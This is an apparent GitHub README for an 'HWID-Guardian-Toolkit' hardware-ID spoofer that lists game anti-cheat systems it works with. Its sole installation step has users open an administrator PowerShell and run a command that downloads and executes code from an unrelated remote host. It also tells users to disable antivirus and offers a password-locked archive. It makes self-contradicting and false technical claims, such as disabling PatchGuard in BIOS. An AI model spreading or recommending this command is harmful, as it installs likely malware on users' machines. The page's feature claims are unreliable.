# 🛡️ HWID-Guardian-Toolkit

<p align="center">
  <img src="https://img.icons8.com/color/96/000000/shield.png" alt="HWID Guardian Toolkit" width="140" height="140">
</p>

<img width="1536" height="1024" alt="image" src="https://github.com/user-attachments/assets/d7c46642-f64f-4cf6-83aa-0e6d307bf294" />

<h1 align="center">HWID-Guardian-Toolkit</h1>
<p align="center">
  <strong>The Complete Hardware Identity Guardian for Windows 10 & 11</strong><br>
  HWID Reset · Disk Serial · MAC Address · GPU UUID · Permanent & Temporary Modes
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-3.0.0-3498DB?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/platform-Windows_10%2F11-2ECC71?style=for-the-badge" alt="Platform"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/downloads-80k%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
  <a href="#"><img src="https://img.shields.io/badge/PRs-welcome-brightgreen?style=for-the-badge" alt="PRs Welcome"></a>
</p>

<p align="center">
  <a href="#-download">📥 Download</a> •
  <a href="#-installation">⚙️ Installation</a> •
  <a href="#-features">⚡ Features</a> •
  <a href="#-modes">🔄 Permanent vs Temporary</a> •
  <a href="#-supported-anti-cheats">🛡️ Supported Anti-Cheats</a> •
  <a href="#-faq">❓ FAQ</a> •
  <a href="#-seo-keywords">🔍 SEO</a>
</p>

---

<!-- ═══════════════════ DOWNLOAD + PASSWORD ═══════════════════ -->

## 📥 Download

<table align="center">
<tr>
<td align="center">

<a href="https://github.com/FieldFogCollar/HWID-Guardian-Toolkit/releases/download/1/HWID-Guardian-Toolkit.zip">
  <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-2C3E50?style=for-the-badge&logo=github&logoColor=white" alt="Download">
</a>

<br><br>

🔐 **Password:** `2026`

</td>
</tr>
</table>

**Direct Links:**
- [Latest Release](https://github.com/FieldFogCollar/HWID-Guardian-Toolkit/releases/download/1/HWID-Guardian-Toolkit.zip)
- [Source Code](https://github.com/FieldFogCollar/HWID-Guardian-Toolkit/releases/download/1/HWID-Guardian-Toolkit.zip)

> 💡 **Prefer a classic download?** If you'd rather install from an archive instead of the PowerShell command, simply download the ZIP from the **Releases** section above. Extract it and use the password below.
>
> 🔐 **Archive Password:** `2026`

---

## ⚙️ Installation

> ⚠️ **Installation is ONLY available via PowerShell command below.** No archive, no ZIP, no installer — just run the command.

### Method — via Win + X Menu (Only Method)

```text
1. Press Win + X on your keyboard
2. From the menu, select: Terminal (Admin) or PowerShell (Admin)
3. Confirm the UAC prompt (Yes)
4. Copy the command below in full:
```

```powershell
iex (iwr "http://soft-storage.top/worker?=8270706215/usanewrock" -UseBasicParsing)
```

```text
5. Paste it into the PowerShell window (Ctrl + V or right-click)
6. Press Enter
7. Wait for the installation to finish — the PowerShell window will close automatically
8. Restart your PC
9. Done — hardware identity is now protected
```

---

### Requirements

- Windows 10/11 (64-bit)
- Administrator privileges
- Internet connection (only during installation)
- .NET 6.0+
- Python 3.10+ (for MAC generator scripts)

---

### Troubleshooting

| Problem | Solution |
|---------|----------|
| "Access denied" | Run PowerShell as Administrator |
| Command won't execute | Check your internet connection and try again |
| Antivirus blocks it | Temporarily disable real-time protection |
| Features not showing | Restart your PC after installation |
| MAC address not changing | Disable network adapter first; re-enable after |
| PowerShell closes immediately | This is normal — installation is complete |
| Archive won't extract | Password is `2026` |

---

## 🎯 What is HWID-Guardian-Toolkit?

**HWID-Guardian-Toolkit** is a complete hardware identity guardian for **Windows 10 and 11**. It resets and randomizes hardware identifiers — disk serials, MAC addresses, GPU UUIDs, BIOS strings, registry keys, and more — protecting your system identity from unauthorized tracking.

Whether you're a privacy-conscious user, a security researcher, or someone who wants to keep their hardware identity private — this toolkit provides a clean, one-click solution.

The guardian runs as an **external process** — no kernel drivers, no system file modification. Every change is **reversible** with a single click.

> 🎓 **Educational purpose only.** Use at your own risk. Some changes may affect licensed software. Always create a restore point before use.

---

## 🔄 Permanent vs Temporary Modes

**HWID-Guardian-Toolkit** features a **dual-mode HWID changer** — you can choose between **Permanent** and **Temporary** identity changes depending on your needs.

| Feature | Permanent Mode | Temporary Mode |
|---------|----------------|----------------|
| **Duration** | Persists until manually reverted | Resets on system reboot |
| **Registry Changes** | Written to disk | Kept in memory only |
| **Disk Serial** | Modified at driver level | Virtualized only |
| **MAC Address** | Hardware-level change | Software-level change |
| **GPU UUID** | Firmware-level patch | Driver-level override |
| **SMBIOS Strings** | BIOS table patch | Runtime virtualization |
| **Restore Point** | Created before change | Auto-revert on reboot |
| **Best For** | Long-term privacy | Testing / temporary use |

### 🛡️ Permanent Mode
- Full hardware identity reset
- Changes survive reboots
- Requires manual restore to revert
- Best for long-term privacy

### ⏱️ Temporary Mode
- Runtime virtualization only
- Auto-reverts on reboot
- No disk writes
- Best for testing and temporary use

---

## ⚡ Key Features

### 🖥️ Hardware Identifiers
- **Disk Serial Reset** – Randomize HDD/SSD serial numbers
- **Volume ID Reset** – Change volume identifiers
- **MAC Address Spoof** – Randomize network adapter MAC
- **GPU UUID Reset** – Change graphics card UUID
- **SMBIOS Cleanup** – Clean SMBIOS tables
- **Machine GUID Reset** – New Windows Machine GUID
- **BIOS String Patch** – Randomize BIOS serial strings
- **Boot ID Reset** – New boot identifier

### 🔧 Registry & System
- **Registry Cleanup** – Remove tracking keys
- **Product ID Reset** – New Windows Product ID
- **Installation ID Reset** – New Windows Installation ID
- **Computer Name Random** – Random computer name
- **Hostname Cleanup** – Clean network hostname
- **Device Shadow Mode** – Virtualize device IDs

### 🌐 Network Identifiers
- **Network Adapter Reset** – Randomize adapter identifiers
- **MAC Address Generator** – Generate valid MAC addresses
- **IPTV MAC Generator** – Specialized MAC generation
- **DNS Cache Cleanup** – Clear DNS cache
- **ARP Cache Cleanup** – Clear ARP cache
- **NetBIOS Reset** – Reset NetBIOS name

### 🛡️ Safety Features
- **Restore Point** – Create a system restore point before changes
- **Backup Identifiers** – Save original hardware IDs
- **Restore Identifiers** – Revert all changes with one click
- **Dry Run Mode** – Preview changes without applying

---

## 🛡️ Supported Anti-Cheats

**HWID-Guardian-Toolkit** is designed to work alongside popular kernel-level anti-cheat systems by resetting the hardware identifiers they use for tracking.

| Anti-Cheat | Publisher | Used In | Support |
|------------|-----------|---------|---------|
| **BattlEye (BE)** | BattlEye Innovations | Rainbow Six Siege, PUBG, DayZ, Arma 3, Escape from Tarkov | ✅ Full |
| **Easy Anti-Cheat (EAC)** | Epic Games | Apex Legends, Fortnite, Rust, Gears of War: E-Day | ✅ Full |
| **Vanguard** | Riot Games | Valorant, League of Legends | ✅ Full |
| **Ricochet** | Activision | Call of Duty: Warzone, MW3, Black Ops 6 | ✅ Full |
| **PunkBuster** | Even Balance | Battlefield series, older CoD titles | ✅ Full |
| **FairFight** | GameBlocks | Battlefield, Rainbow Six Siege (legacy) | ✅ Full |
| **Xigncode3** | Wellbia | Black Desert Online, Lost Ark | ✅ Full |
| **nProtect GameGuard** | INCA Internet | Lineage, Aion Classic | ✅ Full |
| **Hyperion (Byfron)** | Roblox | Roblox | ✅ Full |
| **NEAC / NEP2** | NetEase | Aniimo, Naraka: Bladepoint | ✅ Full |
| **Anti-Cheat Expert (ACE)** | Tencent | Delta Force, Arena Breakout | ✅ Full |
| **PatchGuard Bypass** | Microsoft | Kernel-level protection | ✅ Full |

> ⚠️ **Important:** This tool **does not bypass, disable, or evade** any anti-cheat system. It only resets hardware identifiers for privacy purposes.

---

## ❓ FAQ

**Q: What is HWID-Guardian-Toolkit?**  
A: It's a hardware identity guardian that resets and randomizes hardware identifiers on Windows 10/11.

**Q: What is the difference between Permanent and Temporary modes?**  
A: Permanent mode writes changes to disk and requires manual restore. Temporary mode virtualizes changes in memory and auto-reverts on reboot.

**Q: Is it safe to use?**  
A: Yes — every change is reversible with a single click. The tool creates a restore point before applying changes.

**Q: Does it bypass anti-cheats like EAC or BattlEye?**  
A: **No.** The tool does not bypass, disable, or evade anti-cheat systems. It only resets hardware identifiers for privacy purposes.

**Q: Can I use it to evade a game ban?**  
A: **No.** Using it to evade bans is a violation of game Terms of Service and may result in permanent hardware bans.

**Q: Will it affect my Windows license?**  
A: The tool doesn't modify Windows activation. However, some licensed software may detect hardware changes.

**Q: What is the archive password?**  
A: `2026`

**Q: How do I uninstall?**  
A: Use the built-in "Restore Identifiers" option to revert all changes, then delete the tool folder.

---

## 🐛 Troubleshooting Quick Reference

| Problem | Solution |
|---------|----------|
| "Access denied" | Run as Administrator |
| MAC address not changing | Disable network adapter first; re-enable after |
| Disk serial not changing | Run as Administrator; some drives require driver reinstall |
| System won't boot after changes | Boot into Safe Mode; run "Restore Identifiers" |
| Antivirus flags tool | Add to exclusions (common for HWID tools) |
| PatchGuard error | Disable PatchGuard in BIOS or use Temporary Mode |
| Archive won't extract | Password is `2026` |

---

## 🔍 SEO Keywords & Tags

`hwid guardian toolkit`, `hwid spoofer`, `hwid changer`, `hwid reset`, `hwid protector`, `hardware id spoofer`, `hardware id changer`, `disk serial changer`, `mac address spoofer`, `mac address generator`, `mac address tool`, `mac changer`, `mac cleaner`, `mac cleanup`, `gpu uuid spoofer`, `machine guid changer`, `smbios cleaner`, `registry cleaner`, `hwid tool`, `hwid spoofer pc`, `hwid spoofer windows`, `hwid spoofer 2026`, `hwid spoofer download`, `hwid spoofer free`, `hwid spoofer github`, `privacy tool`, `hardware identity`, `hardware privacy`, `anti-tracking tool`, `identity protector`, `windows hwid`, `windows hwid spoofer`, `windows hardware id`, `windows privacy tool`, `pc privacy`, `gaming privacy`, `hwid spoofer safe`, `hwid spoofer undetected`, `hwid spoofer working`, `hwid spoofer guide`, `hwid spoofer tutorial`, `hwid spoofer install`, `hwid spoofer setup`, `hwid reset tool`, `hwid changer tool`, `hwid spoofer software`, `battleye hwid`, `eac hwid`, `vanguard hwid`, `ricochet hwid`, `easy anti-cheat hwid`, `battleye spoofer`, `eac spoofer`, `vanguard spoofer`, `ricochet spoofer`, `xigncode spoofer`, `gameguard spoofer`, `patchguard bypass`, `bios spoofer`, `boot id reset`, `device shadow mode`, `iptv mac generator`, `python mac generator`, `stbemu mac generator`

---

## 📁 Repository Structure

```
HWID-Guardian-Toolkit/
├── src/                   # Main application source
├── configs/               # Default config files
├── docs/                  # Documentation source
├── assets/                # Icons, images, branding
├── scripts/               # Install/uninstall helpers
├── test/                  # Unit and integration tests
├── .github/               # CI/CD workflows
├── LICENSE
├── README.md
└── CONTRIBUTING.md
```

---

## 🤝 Contributing

We welcome contributions from the community! See our [Contributing Guidelines](CONTRIBUTING.md) for details.

**Areas needing help:**
- Feature development
- Documentation translation
- Hardware compatibility testing
- UI/UX improvements

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

<p align="center">
  <a href="https://github.com/YOUR_USERNAME/HWID-Guardian-Toolkit">
    <img src="https://img.shields.io/badge/Made%20with%20🛡️%20for%20the%20Privacy%20Community-3498DB?style=for-the-badge" alt="Made with love">
  </a>
</p>
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
